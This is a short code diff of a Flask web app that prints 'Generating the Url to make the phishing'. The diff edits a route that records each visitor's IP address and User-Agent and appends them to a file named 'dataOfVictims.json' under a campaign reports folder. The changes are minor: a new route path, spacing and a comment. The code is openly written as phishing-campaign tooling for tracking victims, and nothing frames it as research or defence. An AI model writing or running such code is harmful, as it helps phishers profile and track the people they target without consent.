@@ -11,16 +11,19 @@ dataEntry=[]
 numEntries=0
 print("Generating the Url to make the phishing")
 userData={}
-@app.route('/<userName>',methods=['GET'])
+@app.route('/user/<userName>',methods=['GET'])
 def getInfoUser(userName):
     
     global dataEntry, numEntries
     #Get ip of the client
     client_ip= request.remote_addr
+    
     #Get user-agent headers 
     user_agent = request.headers.get('User-Agent')
+    
     #Add a new entry
     numEntries+=1
+    
     #Adding data intern db 
     clientInfo={
         'user_id': numEntries,
@@ -30,6 +33,7 @@ def getInfoUser(userName):
     }
     dataEntry.append(clientInfo)
     
+    #Generate json to save results
     report=json.dumps(clientInfo,indent=4)
     fileReports=open("reportsCampana/dataOfVictims.json","a+")
     fileReports.write(report)
